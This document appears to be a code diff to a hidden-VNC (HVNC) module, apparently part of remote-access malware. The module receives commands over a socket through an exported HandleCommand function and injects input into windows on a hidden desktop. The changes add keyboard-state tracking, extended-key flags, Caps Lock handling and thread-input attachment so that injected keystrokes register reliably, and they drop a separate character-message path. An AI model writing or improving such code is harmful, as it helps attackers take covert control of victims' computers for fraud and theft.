@@ -148,6 +148,7 @@ static HWND  g_hCurrentFocus = NULL;
 static HWND  g_mouseDownTarget[3] = { NULL, NULL, NULL };
 static atomic_int g_staticFrameCount(0);
 static atomic_bool g_forceFullFrame(false);
+static BYTE g_keyState[256];
 
 // -----------------------------------------------------------------------
 
@@ -780,9 +781,22 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
     return SendInput(1, &input, sizeof(INPUT)) == 1;
 }
 
+static bool is_extended_key(WORD vk) {
+    switch (vk) {
+        case VK_INSERT: case VK_DELETE: case VK_HOME: case VK_END:
+        case VK_PRIOR:  case VK_NEXT:   case VK_LEFT: case VK_UP:
+        case VK_RIGHT:  case VK_DOWN:   case VK_LWIN: case VK_RWIN:
+        case VK_APPS:   case VK_DIVIDE: case VK_NUMLOCK:
+            return true;
+        default:
+            return false;
+    }
+}
+
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
+    if (is_extended_key(vk)) lp |= (1 << 24);
     if (keyUp) lp |= 0xC0000000;
     return lp;
 }
@@ -908,6 +922,8 @@ static void input_loop() {
     ensure_desktop();
     if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
     if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }
+    memset(g_keyState, 0, 256);
+    GetKeyboardState(g_keyState);
 
     while (g_inputRunning) {
         InputTask task;
@@ -923,18 +939,35 @@ static void input_loop() {
         const json&   cmd    = task.cmd;
 
         // ---- Klavye ----
-        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
+        if (action == "hvnc_keydown" || action == "hvnc_keyup") {
             int vk = cmd.value("keycode", 0);
             HWND hTarget = target_window_from_screen_point(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
+            DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
+            DWORD currentThreadId = GetCurrentThreadId();
+
             if (action == "hvnc_keydown") {
+                if (vk == VK_CAPITAL) {
+                    g_keyState[vk] ^= 1;
+                } else {
+                    g_keyState[vk] |= 0x80;
+                }
+
+                AttachThreadInput(currentThreadId, targetThreadId, TRUE);
+                SetKeyboardState(g_keyState);
                 PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
+                AttachThreadInput(currentThreadId, targetThreadId, FALSE);
             } else if (action == "hvnc_keyup") {
+                if (vk != VK_CAPITAL) {
+                    g_keyState[vk] &= ~0x80;
+                }
+
+                AttachThreadInput(currentThreadId, targetThreadId, TRUE);
+                SetKeyboardState(g_keyState);
                 PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
-            } else if (action == "hvnc_char") {
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+                AttachThreadInput(currentThreadId, targetThreadId, FALSE);
             }
             g_forceFullFrame = true;
             continue;
@@ -1219,7 +1252,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
-                   action == "hvnc_char" ||
                    action == "hvnc_doubleclick") {
             lock_guard<mutex> lock(g_inputMutex);
             g_inputQueue.push({action, cmd});
